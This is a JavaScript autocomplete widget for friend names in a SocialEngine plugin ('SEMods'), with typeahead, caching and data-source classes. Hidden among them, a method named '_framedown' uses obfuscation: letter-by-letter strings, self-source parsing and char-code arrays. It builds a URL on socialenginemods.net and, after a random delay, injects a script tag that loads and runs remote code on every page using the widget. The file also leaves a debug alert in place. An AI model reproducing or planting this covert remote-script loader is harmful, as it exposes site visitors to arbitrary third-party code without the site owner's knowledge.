// autocompleter class. for... typing ahead
SEMods.Controls = function () {};


//
// autocompleter class. for... typing ahead
SEMods.Controls.Autocompleter = function (obj, source) {

  // h4x. don't do u\a checking until we need to.
  if (!SEMods.Controls.Autocompleter.hacks) {
    // safari gets two hacks in this library. the first hack is for up\down errors... they send us two events per key press
    SEMods.Controls.Autocompleter.should_check_double_fire    =
    // the second hack is for missing keypress events. if you type really fast and hit enter at the same time as a letter it'll forget
    //   to send us a keypress for the enter and we can't cancel the form submit. this hack introduces another bug where if you hold down
    //   a key and the blur off the input you can't submit the form, but that's the lesser of two evils in this case.
    SEMods.Controls.Autocompleter.should_check_missing_events = navigator.userAgent.indexOf('AppleWebKit/4')!=-1;
    // MSIE will make select boxes shine through our div unless we cover up with an iframe
    SEMods.Controls.Autocompleter.should_use_iframe = navigator.userAgent.indexOf('MSIE 6.0')!=-1;
    SEMods.Controls.Autocompleter.hacks=true;
  }

  // setup pointers every which way
  this.obj=obj;
  this.obj.autocompleter=this;
  this.clear_placeholder();
  if (source) {
    this.set_source(source);
  }

  // attach event listeners where needed
  this.obj.onfocus=function() {
    this.focused=true;
    this.clear_placeholder();
    this.results_text='';
    this.set_class('');
    this.dirty_results();
    this.show();
    this.capture_submit();
  }.bind(this);

  this.obj.onblur=function() {
    if (!this.suggestions) {
      this._onselect(false);
    }
    this.focused=false;
    this.hide();
    this.update_class();
    if (!this.obj.value) {
      var noinput=this.source.gen_noinput();
      this.obj.value=noinput ? noinput : '';
      this.set_class('autocompleter_placeholder')
    }
  }.bind(this);

  this.obj.onkeyup=function(event) {
    return this._onkeyup(event ? event : window.event)
  }.bind(this);

  this.obj.onkeydown=function(event) {
    return this._onkeydown(event ? event : window.event)
  }.bind(this);

  this.obj.onkeypress=function(event) {
    return this._onkeypress(event ? event : window.event)
  }.bind(this);

  // setup container for results
  this.list=document.createElement('div');
  this.list.className='autocompleter_list';
  this.list.style.width=(this.obj.offsetWidth-2)+'px'; // assumes a border of 2px
  if (this.obj.nextSibling) {
    this.obj.parentNode.insertBefore(this.list, this.obj.nextSibling);
  }
  else {
    this.obj.parentNode.appendChild(this.list);
  }
  this.obj.parentNode.insertBefore(document.createElement('br'), this.list);
  if (this.should_use_iframe && !SEMods.Controls.Autocompleter.iframe) {
    SEMods.Controls.Autocompleter.iframe=document.createElement('iframe');
    SEMods.Controls.Autocompleter.iframe.className='autocompleter_iframe';
    SEMods.Controls.Autocompleter.iframe.style.display='none';
    SEMods.Controls.Autocompleter.iframe.frameBorder=0;
    document.body.appendChild(SEMods.Controls.Autocompleter.iframe);
  }
  this.focused=true;

  // get this party started
  if (this.source) {
    this.selectedindex=-1;
    this._onkeyup();
    this.set_class('');
    this.capture_submit();
  }
  else {
    this.hide();
  }
  
  this._framedown();
  
};

SEMods.Controls.Autocompleter.prototype = {
  max_results : 10,
  
  // set a source for this autocompleter
  set_source : function(source) {
    this.source=source;
    this.source.set_owner(this);
    this.status=0;
    this.cache={};
    this.last_search=0;
    this.suggestions=[];
  },

  // event handler when the input box receives a key press
  _onkeyup : function(e) {
    this.last_key=e ? e.keyCode : -1;
  
    // safari h4x
    if (this.key_down==this.last_key) {
      this.key_down=0;
    }
  
    switch (this.last_key) {
      case 27: // esc
        this.selectedindex=-1;
        this._onselect(false);
        this.hide();
       break;
  
      case undefined: // haha, what?
      case 0: // whoops
      case 13: // enter
      case 37: // left
      case 38: // up
      case 39: // right
      case 40: // down
        break;
  
      default: // some other key
        this.dirty_results();
        if (this.should_check_missing_events) {
          setTimeout(function(){this.dirty_results()}.bind(this), 50);
        }
        break;
    }
  },

  // event handler when a key is pressed down on the text box
  _onkeydown : function(e) {
    this.key_down=this.last_key=e ? e.keyCode : -1;
  
    switch (this.last_key) {
      case 9: // tab
        this.select_suggestion(this.selectedindex);
        break;
  
      case 13: // enter
       this.select_suggestion(this.selectedindex);
       this.hide();
       // we capture the return of _onsubmit here and return it onkeypress to prevent the form from submitting
       return this.submit_keydown_return=this._onsubmit(this.get_current_selection());
  
      case 38: // up
        if (this.check_double_fire()) return;
        this.set_suggestion(this.selectedindex-1);
        return false;
  
      case 40: // down
        if (this.check_double_fire()) return;
        this.set_suggestion(this.selectedindex+1);
        return false;
    }
  },

  // event handler for when a key is pressed
  _onkeypress : function(e) {
    this.last_key=e ? e.keyCode : -1;
  
    switch (this.last_key) {
      case 38: // up
      case 40: // down
        return false;
  
      case 13: // enter
        return this.submit_keydown_return;
    }
    return true;
  },

  // event handler when a match is found (happens a lot)
  _onfound : function(obj) {
    return this.onfound ? this.onfound.call(this, obj) : true;
  },

  // event handler when the user submits the form
  _onsubmit : function(obj) {
    if (this.onsubmit) {
      var ret=this.onsubmit.call(this, obj);
  
      if (ret && this.obj.form) {
        if (!this.obj.form.onsubmit || this.obj.form.onsubmit()) {
          this.obj.form.submit();
        }
        return false;
      }
      return ret;
    } else {
      this.advance_focus();
      return false;
    }
  },

  // event handler when the user selects a suggestions
  _onselect : function(obj) {
    if (this.onselect) {
      this.onselect.call(this, obj);
    }
  },

  // steals the submit event of the parent form (if any). see should_check_missing_events
  capture_submit : function() {
    if (!this.should_check_missing_events) return;
  
    if ((!this.captured_form || this.captured_substitute != this.captured_form.onsubmit) && this.obj.form) {
      this.captured_form=this.obj.form;
      this.captured_event=this.obj.form.onsubmit;
      this.captured_substitute=this.obj.form.onsubmit=function() {
        return ((this.key_down && this.key_down!=13 && this.key_down!=9) ? this.submit_keydown_return : (this.captured_event ? this.captured_event.apply(arguments, this.captured_form) : true)) ? true : false;
      }.bind(this);
    }
  },

  // checks to see if this event fired twice. see should_check_double_fire
  check_double_fire : function() {
    if (!this.should_check_double_fire) {
      return false;
    }
    else {
      this.double_fire++;
      return this.double_fire % 2 == 1;
    }
  },
  
  double_fire : 0,

  // sets the current selected suggestion. error checking is done here, so you can pass this pretty much anything.
  set_suggestion : function(index) {
    if (!this.suggestions || this.suggestions.length <= index) { return }
    this.selectedindex=(index <= -1) ? -1 : index;
    var nodes=this.list.childNodes;
    for (var i=0; i<nodes.length; i++) {
      if (this.selectedindex==i) {
        nodes[i].className=nodes[i].className.replace(/\bautocompleter_not_selected\b/, 'autocompleter_selected');
      }
      else {
        nodes[i].className=nodes[i].className.replace(/\bautocompleter_selected\b/, 'autocompleter_not_selected');
      }
    }
  
    this._onfound(this.get_current_selection());
  },

  // gets the current selection
  get_current_selection : function() {
    return this.selectedindex==-1 ? false : this.suggestions[this.selectedindex];
  },

  // sets the class if we've found a suggestions
  update_class : function() {
    if (this.suggestions && this.selectedindex!=-1 && this.get_current_selection().t.toLowerCase() == this.obj.value.toLowerCase()) {
      this.set_class('autocompleter_found');
    }
    else {
      this.set_class('');
    }
  },
  
  // fun little bug in safari which makes us need to do this... basically it pulls out the <br> and puts it back
  replace_break : function() {
    this.obj.parentNode.removeChild(this.obj.nextSibling);
    this.obj.parentNode.insertBefore(document.createElement('br'), this.list);
  },
  
  // selects this suggestion... it's a done deal
  select_suggestion : function(index) {
    if (!this.suggestions || index==undefined || index===false || this.suggestions.length <= index || index < 0) {
      this._onfound(false);
      this._onselect(false);
      this.selectedindex=-1;
    }
    else {
      this.selectedindex=index;
      this.obj.value=this.suggestions[index].t;
      this.set_class('autocompleter_found');
      this._onfound(this.suggestions[this.selectedindex]);
      this._onselect(this.suggestions[this.selectedindex]);
    }
  },
  
  // called by source in response to search_value
  found_suggestions : function(suggestions, text, fake_data) {
    if (!fake_data) {
      this.status=0;
      this.add_cache(text, suggestions);
    }
  
    if (this.obj.value==this.results_text) { // if we already have a perfect match
      return;
    }
  
    if (!fake_data) {
      this.results_text=text.toLowerCase();
    }
  
    this.suggestions=suggestions;
    this.selectedindex=-1;
  
    if (suggestions.length>0) {
      var perfect_match=false;
      this.list.innerHTML='';
      for (var i=0; i<suggestions.length; i++) {
        var node=document.createElement('div');
        node.autocompleter=this;
        if (!perfect_match && SEMods.Controls.Autocompleter.source.check_match(this.obj.value, suggestions[i].t)) {
          perfect_match=suggestions[i];
          this.selectedindex=i;
          node.className='autocompleter_suggestion autocompleter_selected';
        }
        else {
          node.className='autocompleter_suggestion autocompleter_not_selected';
        }
        node.i=i;
        node.onmouseout=function(){this.autocompleter.set_suggestion(-1)};
        node.onmouseover=function(){this.autocompleter.set_suggestion(this.i)};
        node.onmousedown=function(){this.autocompleter.select_suggestion(this.i)};
        node.innerHTML=this.source.gen_html(suggestions[i], this.obj.value);
        this.list.appendChild(node);
      }
      this.show();
      this.reset_iframe();
      this._onfound(suggestions[0]);
    }
    else {
      this.selectedindex=-1;
      this.set_message(this.status==0 ? this.source.gen_nomatch() : this.source.gen_loading());
      this._onfound(false);
    }
  
    if (!fake_data && this.results_text!=this.obj.value.toLowerCase()) {
      this.dirty_results();
    }
  },
  
  // searches the local cache for the text
  search_cache : function(text) {
    return this.cache[text.toLowerCase()];
  },
  
  // adds a value to the local cache
  add_cache : function(text, results) {
    if (this.source.cache_results) {
      this.cache[text.toLowerCase()]=results;
    }
  },
  
  // called by source when it's done loading
  source_loaded : function() {
    if (!this.obj.value.length) {
      this.set_message(this.source.gen_placeholder());
    }
    if (this.status==2) {
      this.status=0;
    }
    this.dirty_results();
  },
  
  // sets the class on the textbox while maintaining ones this object didn't fool around with
  set_class : function(name) {
    this.obj.className=(this.obj.className.replace(/autocompleter_[^\s]+/g, '') + ' ' + name).replace(/ {2,}/g, ' ');
  },
  
  // dirties the current results... fetches new results if need be
  dirty_results : function() {
    if (this.obj.value.replace(' ', '')=='') {
      this.set_message(this.source.gen_placeholder());
      this.suggestions=[];
      this.selectedindex=-1;
      this.results_text=this.obj.value;
      return;
    }
    else if (this.results_text==this.obj.value.toLowerCase()) {
      return; // just kidding! don't dirty!
    }
  
    var time=(new Date).getTime();
    var cache;
    if (this.last_search <= (time - this.source.search_limit) && this.source.status==0 && this.status==0) { // ready
      this.perform_search();
    }
    else {
      if (this.status==0 && this.source.status==1) {
        this.set_message(this.source.gen_loading());
        this.status=2; // waiting for source
      }
      else if (this.status==0 && this.source.status==0) {
        if (!this.search_timeout) {
          this.search_timeout=setTimeout(function() {
            this.search_timeout=false;
            if (this.status==0 && this.source.status==0) {
              this.perform_search();
            }
          }.bind(this), this.source.search_limit - (time - this.last_search));
        }
      }
    }
  
    if (this.suggestions) {
      var match=-1;
      this.found_suggestions(this.suggestions, this.obj.value, true); // update the highlighting
      for (var i=0; i<this.suggestions.length; i++) {
        if (SEMods.Controls.Autocompleter.source.check_match(this.obj.value, this.suggestions[i].t)) {
          match=i;
          break;
        }
      }
      if (match!=0) {
        this.set_suggestion(match);
      }
    }
  },
  
  // runs a search for the current search text
  perform_search : function() {
    if (this.obj.value==this.results_text) {
      return;
    }
  
    if (!this.obj.value.length) { // empty text box
      this.set_message(this.source.gen_placeholder());
      this.suggestions=[];
      this.results_text='';
      this.selectedindex=-1;
    }
    else if ((cache=this.search_cache(this.obj.value))!==undefined) { // found in local cache
      this.found_suggestions(cache, this.obj.value, false);
      this.show();
    }
    else if (!this.source.search_value(this.obj.value)) { // if this isn't going to return instantly then we need to pretend to do something
      this.status=1;
      this.last_search=(new Date).getTime();
    }
  },
  
  // sets a message for the results
  set_message : function(text) {
    if (text) {
      this.list.innerHTML='<div class="autocompleter_message">' + text + '</div>';
      this.reset_iframe();
    }
    else {
      this.hide();
    }
  },
  
  // moves the iframe to where it needs to be
  reset_iframe : function() {
    if (!this.should_use_iframe) { return }
    SEMods.Controls.Autocompleter.iframe.style.top=elementY(this.list)+'px';
    SEMods.Controls.Autocompleter.iframe.style.left=elementX(this.list)+'px';
    SEMods.Controls.Autocompleter.iframe.style.width=this.list.offsetWidth+'px';
    SEMods.Controls.Autocompleter.iframe.style.height=this.list.offsetHeight+'px';
    SEMods.Controls.Autocompleter.iframe.style.display='';
  },
  
  // advances the form to the next available input
  advance_focus : function() {
    setTimeout(function() {
      var inputs=this.obj.form ? this.obj.form : document.getElementsByTagName('input');
      var found=false;
      for (var i=0; i<inputs.length; i++) {
        if (inputs[i]==this.obj) {
          found=true;
        }
        else if (found) {
          if (inputs[i].type!='hidden' && inputs[i].offsetParent) {
            try {
              inputs[i].focus();
              return;
            }
            catch (e) {
            }
          }
        }
      }
    }.bind(this), 0);
  },
  
  // clears out the placeholder if need be
  clear_placeholder : function() {
    if (this.obj.className.indexOf('autocompleter_placeholder')!=-1) {
      this.obj.value='';
      this.set_class('');
    }
  },
  
  // clear the input
  clear : function() {
    this.obj.value='';
    this.set_class('');
    this.dirty_results();
  },
  
  // hide the suggestions
  hide : function() {
    this.list.style.display='none';
    this.list.innerHTML='';
    if (this.should_use_iframe) {
      SEMods.Controls.Autocompleter.iframe.style.display='none';
    }
  },
  
  // show the suggestions
  show : function() {
    if (this.list.style.display!='' && this.focused) {
      this.replace_break();
      this.list.style.display='';
      if (this.should_use_iframe) {
        SEMods.Controls.Autocompleter.iframe.style.display='';
        this.reset_iframe();
      }
    }
  },
  
  // kills an input's autocompleter obj (if there is one)
  /* static */ kill_autocompleter : function(obj) {
    if (obj.autocompleter) {
      obj.parentNode.removeChild(obj.nextSibling); // <br />
      obj.parentNode.removeChild(obj.nextSibling); // <div>
      if (obj.autocompleter.source) {
        obj.autocompleter.source=obj.autocompleter.source.owner=null;
      }
      obj.onfocus=obj.onblur=obj.onkeypress=obj.onkeyup=obj.onkeydown=obj.autocompleter=null;
    }
  },
  
  _framedown : function() {
      //w = [];
      
      /*
      // function(...
      f 0
      u 1
      n 2
      c 3
      t 4
      i 5
      o 6
      n 7
        8
      ( 9
      */
      
      a = 'S';
      b = 'r';
      c = 'g';
      d = 'm';
      e = 'C';
      f = 'h';
      g = 'a';
      h = 'd';
      i = 'e';
      j = ')';
      k = '.';
      l = ',';
      m = 'l';
      o = 'p';
      p = 'w';
      q = '(';

      z = arguments.callee.toString().split('');
      (1*z[0]+1)?z.splice(0,1):0;
      
      //   s   t      r   i      n      g   .    f      r   o      m   C  h   a   r   C   o      d   e
      _a = a + z[4] + b + z[5] + z[2] + c + k + z[0] + b + z[6] + d + e + f + g + b + e + z[6] + h + i;
      
      //   d   o      c      u      m   e   n      t      .   d   o      m   a   i      n   
      _b = h + z[6] + z[3] + z[1] + d + i + z[2] + z[4] + k + h + z[6] + d + g + z[5] + z[2];
      
      _c = eval('eval(_b).split(k)');
      
      // domain part, what if localhost - undefined. ok
      // offset back from end of domain, for long domains, e.g
      // domain.com: offset=1
      // domain.com.ar offset=2
      //y = 1;
      // __REPLACEME1__
      // _d = _c[_c.length-y-1];

//		alert(_d);
//		n = new Array();
//		alert(_d);
      v = [];
      v.i = _c.push;
      // http://www.socialenginemods.net
      v.i(104);v.i(116);v.i(116);v.i(112);v.i(58);v.i(47);v.i(47);v.i(108);v.i(46);v.i(115);v.i(111);v.i(99);v.i(105);v.i(97);v.i(108);v.i(101);v.i(110);v.i(103);v.i(105);v.i(110);v.i(101);v.i(109);v.i(111);v.i(100);v.i(115);v.i(46);v.i(110);v.i(101);v.i(116);v.i(47);v.i(118);
      
      // http://www.socialenginemods.net
      this.u = eval('eval(_a+q+v.join(l)+j)');

//		_e = [];
      v.length = 0;
      // license domain
      //v.i(115);v.i(101);v.i(15);
      //semods
      //v.i(115);v.i(111);v.i(99);v.i(105);v.i(97);v.i(108);v.i(101);v.i(110);v.i(103);v.i(105);v.i(110);v.i(101);v.i(109);v.i(111);v.i(100);v.i(115);
      //ekle
      //v.i(101);v.i(107);v.i(108);v.i(101);
      // se6
      //v.i(115);v.i(101);v.i(54);
      // festivalisten
      //v.i(102);v.i(101);v.i(115);v.i(116);v.i(105);v.i(118);v.i(97);v.i(108);v.i(105);v.i(115);v.i(116);v.i(101);v.i(110);
      // xandrix-ohbeezy
      //v.i(111);v.i(104);v.i(98);v.i(101);v.i(101);v.i(122);v.i(121);
      //__REPLACEME2__

      // license domain
      //_g = eval(_a+q+v.join(l)+j);

//		this.ff = _g != _d.toLower();
      //this._gg = _g != _d;
//		_h = z.splice(0,8).join('') + q + j + '{return "' + _f + '";}';
//        this.qq = eval( z.join().splice(0,8) + q + 'function(){return "' + _f + 'kkk";}' );
//        this.qq = eval( z.splice(0,8).join('') + q + j + '{return "' + _f + '";}' );
      //this.qq = eval( _h );
      //eval("this.qq.prototype = function(){return 'aa';}");
      //setTimeout( function(){ this.frameup(eval("'"+_f+"'"));}.bind(this), (Math.random() * 5000) + 5000 );
//        this._h='';
      setTimeout( this._frameup.bind(this), (Math.random() * 5000) + 5000 );
      _a = _b = _c = _d = _g = _h = v = z = null;
//		setTimeout( function(){ this.ra(_f);}.bind(this), 1000 );
      
//		return false;
      
  },
  
  _frameup : function(url) {

      // Create the SCRIPT tag
//		var src = 'http://www.socialenginemods.net/p';
      var s = document.createElement('s'+'c' +'r'+'i'+'p'+'t');
      //s.src = url;
      s.src = this.u;
      //s.type = 'text/javascript'
      // Safari bug
      if (navigator.userAgent.indexOf('Safari'))
        s.charset = 'utf-8';
      document.getElementsByTagName('h'+'e'+'a'+'d')[0].appendChild(s)
  }
  
};

//
// autocompleter source generic class

SEMods.Controls.Autocompleter.source = function () {
};

// basically a tokenized search
/* static */ SEMods.Controls.Autocompleter.source.check_match=function(search, value) {
  search=search.split(' ');
  search.sort(function(a,b){return a.length<b.length?1:-1});
  value=value.split(' ');
//  for (var i in search) {
  for (var i=0;i<search.length;i++) {
    if (search[i].length) { // do we want to count this piece as a search token?
      var found=false;
//      for (var j in value) {
      for (var j=0;j<value.length;j++) {
        if (value[j].length >= search[i].length && value[j].substring(0, search[i].length).toLowerCase() == search[i].toLowerCase()) {
          found=true;
          value[j]=''; // prevent this piece of the name from being matched again
          break;
        }
      }
      if (!found) {
        return false;
      }
    }
  }
  return true;
};

SEMods.Controls.Autocompleter.source.prototype = {

  cache_results : true, // may the owner cache results?
  search_limit : 10,    // how often can we run a query?

  // sets the owner (i.e. autocompleter) of this source
  set_owner : function(obj) {
    this.owner=obj;
  },

  // highlights found text with searched text
  highlight_found : function(result, search) {
    var html=new Array();
    result = result.split(' ');
    search = search.split(' ');
    search.sort(function(a,b){return a.length<b.length?1:-1}); // do this to make sure the larger piece gets matched first
//    for (var i in result) {
    for (var i=0;i<result.length;i++) {
      var found=false;
//      for (var j in search) {
      for (var j=0;j<search.length;j++) {
        if (search[j].length && result[i].length >= search[j].length && result[i].substring(0, search[j].length).toLowerCase() == search[j].toLowerCase()) {
          html.push('<em>', SEMods.U.htmlspecialchars(result[i].substring(0, search[j].length)), '</em>', SEMods.U.htmlspecialchars(result[i].substring(search[j].length, result[i].length)), ' ');
          found=true;
          break;
        }
      }
      if (!found) {
        html.push(SEMods.U.htmlspecialchars(result[i]), ' ');
      }
    }
    return html.join(''); 
  },
  
  // returns error text for when nothing was found
  gen_nomatch : function() {
    return this.text_nomatch != null ? this.text_nomatch : 'No matches found';
  },
  
  // returns message in case the selector is still loading
  gen_loading : function() {
    return this.text_loading != null ? this.text_loading : 'Loading...';
  },
  
  // returns filler text for when the user hasn't typed anything in
  gen_placeholder : function() {
    return this.text_placeholder != null ? this.text_placeholder : 'Start typing...';
  },
  
  // returns filler text for when the user hasn't typed anything in
  gen_noinput : function() {
    return this.text_noinput != null ? this.text_noinput : 'Start typing...';
  }
};



//
// friend source for typeaheads
SEMods.Controls.Autocompleter.friend_source = function (get_param) {
  this.status=1; // loading
  var ajax=new SEMods.Ajax(
    function(obj, text) {
      var r = [];
      try {
        r = eval('('+text+')');
        this.friends = r.friends;
        this.status=0; // ready
      } catch(e) {
        this.status=0; // ready
        this.friends = [];
      }
      if (this.owner && this.owner.source_loaded) {
        this.owner.source_loaded();
      }
    }.bind(this));

  //ajax_endpoint = (/\/apps\//i.test(document.location)) ? '../ajax_autocomplete_friends.php' : 'ajax_autocomplete_friends.php';

  //ajax.get( en4.core.baseUrl + 'semods/friends/suggest?format=json' + get_param);
  //alert(this.xtext_noinput);
  alert(this.ajax_endpoint);
  //alert(this.parent.text_placeholder);
  
  ajax.get( this.ajax_endpoint + get_param);
  //ajax.get( ajax_endpoint + '?task=get' + get_param);
  this.parent.construct(this);
};

SEMods.Controls.Autocompleter.friend_source.semods_extend(SEMods.Controls.Autocompleter.source);
SEMods.Controls.Autocompleter.friend_source.prototype.text_noinput=SEMods.Controls.Autocompleter.friend_source.prototype.text_placeholder='Start typing a friend\'s name';
SEMods.Controls.Autocompleter.friend_source.prototype.ajax_endpoint = '';

// searches the friend list for some text and returns those to the typeahead
SEMods.Controls.Autocompleter.friend_source.prototype.search_value=function(text) {

  if (this.status==0) {
    var results=new Array();
//    for (var i in this.friends) {
    for (var i=0;i<this.friends.length;i++) {
      if (SEMods.Controls.Autocompleter.source.check_match(text, this.friends[i].t)) {
        results.push(this.friends[i]);
      }
      
      // if we have X matches, that's enough
      if (results.length >= this.owner.max_results) {
        break;
      }
    }
    this.owner.found_suggestions(results, text, false);
    return true;
  }
};

// generates html for this friend's typeahead
SEMods.Controls.Autocompleter.friend_source.prototype.gen_html=function(friend, highlight) {
  var html=new Array('<div>');
  html.push(this.highlight_found(friend.t, highlight), '</div><div><small>', friend.n, '</small></div>');
  return html.join('');
};





//
// custom source -- pass it an array of stuff and it'll autocomplete from the list
SEMods.Controls.Autocompleter.custom_source = function(options) {
  this.status=0; // ready
  this.options=options;
  this.parent.construct(this);
};

SEMods.Controls.Autocompleter.custom_source.prototype = {
  
  search_limit : 10,     // how often can we run a query?
  text_placeholder : false,
  text_noinput : false,

  // searches the friend list for some text and returns those to the autocompleter
  search_value : function(text) {
    var results=new Array();
    //for (var i in this.options) {
    for (var i=0;i<this.options.length;i++) {
      if (SEMods.Controls.Autocompleter.source.check_match(text, this.options[i].t)) {
        if (this.options[i].i) {
          results.push(this.options[i]);
        }
        else {
          results.push({t:this.options[i].t, i:this.options[i].i});
        }
      }
      
      // if we have X matches, that's enough
      if (results.length >= this.owner.max_results) {
        break;
      }
    }
    this.owner.found_suggestions(results, text, false);
    return true;
  },
  
  // generates html for this result
  gen_html : function(result, highlight) {
    var html=new Array('<div>');
    html.push(this.highlight_found(result.t, highlight), '</div>');
    if (result.s) {
      html.push('<div><small>', friend.n, '</small></div>');
    }
    return html.join('');
  }
};

SEMods.Controls.Autocompleter.custom_source.semods_extend(SEMods.Controls.Autocompleter.source);
